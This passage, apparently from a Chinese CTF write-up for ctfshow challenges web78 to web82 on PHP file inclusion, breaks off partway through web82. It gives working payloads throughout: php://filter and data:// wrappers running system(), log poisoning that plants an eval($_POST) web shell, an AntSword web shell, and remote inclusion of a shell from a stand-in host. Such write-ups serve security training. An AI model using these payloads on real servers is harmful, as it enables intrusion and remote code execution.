&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;..CTFSHOW..&lt;/code&gt; 解析变量成 &lt;code&gt;__CTFSHOW__&lt;/code&gt; 进行了变量覆盖&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;因为CTFSHOW是类，所以使用 &lt;code&gt;__autoload()&lt;/code&gt; 函数方法加载，最终执行 &lt;code&gt;phpinfo&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?..CTFSHOW..=phpinfo
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818150221826.png&#34; alt=&#34;image-20250818150221826&#34; style=&#34;zoom:25%;&#34; /&gt;

 &lt;h1 id=&#34;web78&#34;&gt;&lt;a href=&#34;#web78&#34; class=&#34;headerlink&#34; title=&#34;web78&#34;&gt;&lt;/a&gt;web78&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 10:52:43
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 10:54:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    include($file);
&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文件包含&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=php://filter/convert.base64-encode/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801171241071.png&#34; alt=&#34;image-20250801171241071&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801171316898.png&#34; alt=&#34;image-20250801171316898&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;伪协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看目录下文件&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=data://text/plain,&amp;lt;?php system(&amp;quot;ls&amp;quot;) ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801172202035.png&#34; alt=&#34;image-20250801172202035&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=data://text/plain,&amp;lt;?php system(&amp;quot;tac flag.php&amp;quot;) ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801171557675.png&#34; alt=&#34;image-20250801171557675&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思路&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Nginx 的日志文件 &lt;code&gt;access.log&lt;/code&gt; 是一个文本文件，记录了用户请求信息。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果我们将一段PHP 代码写进日志，再通过 &lt;code&gt;include(&amp;#39;access.log&amp;#39;)&lt;/code&gt;，PHP 会执行其中的代码。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们构造 POST 请求传参，实现 命令执行（RCE）。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Nginx 默认日志路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果服务器使用的是 Nginx，默认的日志路径通常是：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;访问日志（access log）：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;/var/log/nginx/access.log
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;错误日志（error log）：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;/var/log/nginx/error.log
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;这个路径来源于默认配置文件 &lt;code&gt;/etc/nginx/nginx.conf&lt;/code&gt; 中的一段：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;access_log  /var/log/nginx/access.log;
error_log   /var/log/nginx/error.log;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt; &amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Apache 默认日志路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果使用的是 Apache（httpd）：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;访问日志：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/var/log/apache2/access.log
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;错误日志：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/var/log/apache2/error.log
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;或在某些系统中（如 CentOS）：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/var/log/httpd/access_log
/var/log/httpd/error_log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;这些也都由 Apache 的配置文件 &lt;code&gt;/etc/httpd/conf/httpd.conf&lt;/code&gt; 或 &lt;code&gt;/etc/apache2/apache2.conf&lt;/code&gt; 决定。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;访问日志&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=../../../../var/log/nginx/access.log
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801210238666.png&#34; alt=&#34;image-20250801210238666&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;构造 User-Agent 使其被写入 access.log（日志包含目标）&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php eval($_POST[a]); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801210209458.png&#34; alt=&#34;image-20250801210209458&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;post请求&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;a=system(&amp;quot;tac flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801210122212.png&#34; alt=&#34;image-20250801210122212&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;访问页面时，Nginx 会记录以下信息：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;访问的 URL&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IP 地址&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;请求方法（GET&amp;#x2F;POST）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;User-Agent&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Referer 等&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;日志格式长这样：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;127.0.0.1 - - [01/Aug/2025:12:34:56 +0800] &amp;quot;GET /index.php HTTP/1.1&amp;quot; 200 123 &amp;quot;-&amp;quot; &amp;quot;&amp;lt;?php eval($_POST[&amp;#39;a&amp;#39;]); ?&amp;gt;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个最后的 &lt;code&gt;&amp;lt;?php eval($_POST[&amp;#39;a&amp;#39;]); ?&amp;gt;&amp;quot;&lt;/code&gt; 就是在请求里写的 &lt;code&gt;User-Agent&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web79&#34;&gt;&lt;a href=&#34;#web79&#34; class=&#34;headerlink&#34; title=&#34;web79&#34;&gt;&lt;/a&gt;web79&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:10:14
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:12:38
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    $file = str_replace(&amp;quot;php&amp;quot;, &amp;quot;???&amp;quot;, $file);
    include($file);
&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;过滤了 &lt;code&gt;php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;换成大写 或者 利用短标签替换 &lt;code&gt;php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=data://text/plain,&amp;lt;?Php system(&amp;quot;tac flag.php&amp;quot;) ?&amp;gt;
?file=data://text/plain,&amp;lt;?= system(&amp;quot;tac flag.php&amp;quot;) ?&amp;gt;


#甚至可以这样
?file=data://text/plain,&amp;lt;?PHP system(&amp;quot;tac flag.php&amp;quot;) ?&amp;gt;
?file=data://text/plain,&amp;lt;?= system(&amp;quot;tac ????????&amp;quot;) ?&amp;gt;
?file=data://text/plain,&amp;lt;?= system(&amp;quot;tac f???.???&amp;quot;) ?&amp;gt;
?file=data://text/plain,&amp;lt;?= system(&amp;quot;tac flag.ph?&amp;quot;) ?&amp;gt;
?file=data://text/plain,&amp;lt;?= system(&amp;quot;tac f*&amp;quot;) ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801232241216.png&#34; alt=&#34;image-20250801232241216&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将 &lt;code&gt;&amp;lt;?php system(&amp;quot;tac flag.php&amp;quot;) ?&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;进行base64 编码后 &lt;code&gt;PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKSA/Pg==&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKSA/Pg==
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802011023891.png&#34; alt=&#34;image-20250802011023891&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GET&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?file=data://text/plain,&amp;lt;?= eval($_POST[a]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a=system(&amp;quot;tac flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802002404164.png&#34; alt=&#34;image-20250802002404164&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解四&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;php://input&lt;/code&gt; 是一个PHP协议，允许把请求体当做PHP代码文件包含执行。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;直接访问 &lt;code&gt;php://input&lt;/code&gt;，可以把HTTP请求的请求体当作PHP代码执行。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;这种解法需要在bp操作&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=Php://input
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802003525091.png&#34; alt=&#34;image-20250802003525091&#34; style=&#34;zoom: 33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?Php system(&amp;#39;tac flag.php&amp;#39;)?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802010453916.png&#34; alt=&#34;image-20250802010453916&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解五&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;日志包含&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=../../../../var/log/nginx/access.log


#User-Agent
&amp;lt;?= eval($_POST[a]); ?&amp;gt;


#POST
a=system(&amp;quot;tac flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250801212138779.png&#34; alt=&#34;image-20250801212138779&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web80&#34;&gt;&lt;a href=&#34;#web80&#34; class=&#34;headerlink&#34; title=&#34;web80&#34;&gt;&lt;/a&gt;web80&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:26:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    $file = str_replace(&amp;quot;php&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;data&amp;quot;, &amp;quot;???&amp;quot;, $file);
    include($file);
&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;过滤了 &lt;code&gt;php&lt;/code&gt; &lt;code&gt;data&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;日志包含&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这次日志路径为 &lt;code&gt;/var/log/nginx/access.log&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看目录&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=/var/log/nginx/access.log


#User-Agent
&amp;lt;?= eval($_POST[a]); ?&amp;gt;


#POST
a=system(&amp;quot;ls&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802095400414.png&#34; alt=&#34;image-20250802095400414&#34; style=&#34;zoom: 20%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;flag文件名变换为 &lt;code&gt;fl0g.php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=/var/log/nginx/access.log


#User-Agent
&amp;lt;?= eval($_POST[a]); ?&amp;gt;


#POST
a=system(&amp;quot;tac fl0g.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802095442524.png&#34; alt=&#34;image-20250802095442524&#34; style=&#34;zoom: 20%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;远程文件 &lt;code&gt;http://your-shell.com/1&lt;/code&gt; 是 PHP 脚本，内容如下：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
    eval($_POST[1]);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802101056417.png&#34; alt=&#34;image-20250802101056417&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用远程文件 &lt;code&gt;http://your-shell.com/1&lt;/code&gt; 进行POST&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=http://your-shell.com/1

#POST
1=system(&amp;quot;ls&amp;quot;);
1=system(&amp;quot;tac fl0g.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802101442503.png&#34; alt=&#34;image-20250802101442503&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=Php://input

#请求内容
&amp;lt;?php system(&amp;quot;ls&amp;quot;) ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802102359566.png&#34; alt=&#34;image-20250802102359566&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=Php://input

#请求内容
&amp;lt;?php system(&amp;quot;cat fl0g.php&amp;quot;) ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802102504525.png&#34; alt=&#34;image-20250802102504525&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web81&#34;&gt;&lt;a href=&#34;#web81&#34; class=&#34;headerlink&#34; title=&#34;web81&#34;&gt;&lt;/a&gt;web81&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 15:51:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    $file = str_replace(&amp;quot;php&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;data&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;:&amp;quot;, &amp;quot;???&amp;quot;, $file);
    include($file);
&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;过滤了 &lt;code&gt;php&lt;/code&gt; &lt;code&gt;data&lt;/code&gt; &lt;code&gt;:&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看目录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;code&gt;&amp;lt;?= file_get_contents(&amp;quot;http://your-shell.com/1&amp;quot;); ?&amp;gt;&lt;/code&gt; 需要添加在原 &lt;code&gt;UA&lt;/code&gt; 内容空一格后面（这道题服务器端会对 &lt;code&gt;UA&lt;/code&gt; 格式进行检查，需要保留原&lt;code&gt;UA&lt;/code&gt; 内容）&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=/var/log/nginx/access.log


#User-Agent
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 &amp;lt;?= eval($_POST[a]); ?&amp;gt;


#POST
a=system(&amp;quot;ls&amp;quot;);
a=system(&amp;quot;tac fl0g.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802235003792.png&#34; alt=&#34;image-20250802235003792&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250802235043666.png&#34; alt=&#34;image-20250802235043666&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;蚁剑连接&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;蚁剑一句话木马，添加在 &lt;code&gt;UA&lt;/code&gt; 后面，传入日志&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php @eval($_POST[a]); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250803001820134.png&#34; alt=&#34;image-20250803001820134&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;连接蚁剑，密码为传入的字段&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250803002003634.png&#34; alt=&#34;image-20250803002003634&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用虚拟终端拿到flag&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250803003532075.png&#34; alt=&#34;image-20250803003532075&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;或者直接查看flag文件&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250803003725310.png&#34; alt=&#34;image-20250803003725310&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web82&#34;&gt;&lt;a href=&#34;#web82&#34; class=&#34;headerlink&#34; title=&#34;web82&#34;&gt;&lt;/a&gt;web82&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 19:34:45
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    $file = str_replace(&amp;quot;php&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;data&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;:&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;.&amp;quot;, &amp;quot;???&amp;quot;, $file);
    include($file);
&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思路：利用 PHP 的上传进度功能 &lt;code&gt;session.upload_progress&lt;/code&gt; 把恶意代码注入到服务器临时 &lt;code&gt;session&lt;/code&gt; 文件中，然后再用 &lt;code&gt;include()&lt;/code&gt; 把这个临时文件包含执行。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;知识储备：如果在 &lt;code&gt;cookie&lt;/code&gt; 中设置 &lt;code&gt;PHPSESSID&lt;/code&gt;（即 &lt;code&gt;session&lt;/code&gt; 值）&amp;#x3D; &lt;code&gt;flag&lt;/code&gt;，那么会在服务器上创建一个 &lt;code&gt;/tmp/sess_flag&lt;/code&gt; 文件；对于默认配置，文件内容上传后会被清除，那么我们需要进行环境竞争，在删除之前，对该文件进行文件包含，从而进行命令执行。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;php中的 &lt;code&gt;session.upload_progress&lt;/code&gt; :   &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvc2Vzc2lvbi51cGxvYWQtcHJvZ3Jlc3MucGhw&#34;&gt;PHP: Session 上传进度 - Manual&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在 &lt;code&gt;php.ini&lt;/code&gt; 有其中以下几个&lt;strong&gt;默认选项&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;1. session.upload_progress.enabled = on
2. session.upload_progress.cleanup = on
3. session.upload_progress.prefix = &amp;quot;upload_progress_&amp;quot;
4. session.upload_progress.name = &amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot;
5. session.use_strict_mode=off
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;session.upload_progress.enabled = On&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;📌 &lt;strong&gt;作用：&lt;/strong&gt;&lt;br&gt;是否启用 &lt;strong&gt;上传进度追踪功能&lt;/strong&gt;。&lt;/li&gt;
